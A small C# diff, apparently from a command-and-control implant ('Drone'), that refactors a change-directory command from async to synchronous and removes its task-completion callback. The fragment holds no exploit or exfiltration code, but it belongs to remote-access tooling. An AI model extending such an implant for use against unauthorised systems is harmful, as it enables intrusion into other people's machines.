@@ -11,13 +11,13 @@ public sealed class ChangeDirectory : DroneCommand
     public override byte Command => 0x15;
     public override bool Threaded => false;
 
-    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
+    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         var path = task.Arguments.Any()
             ? task.Arguments[0]
             : Environment.GetFolderPath(Environment.SpecialFolder.Personal);
         
         Directory.SetCurrentDirectory(path);
-        await Drone.SendTaskComplete(task.Id);
+        return Task.CompletedTask;
     }
 }
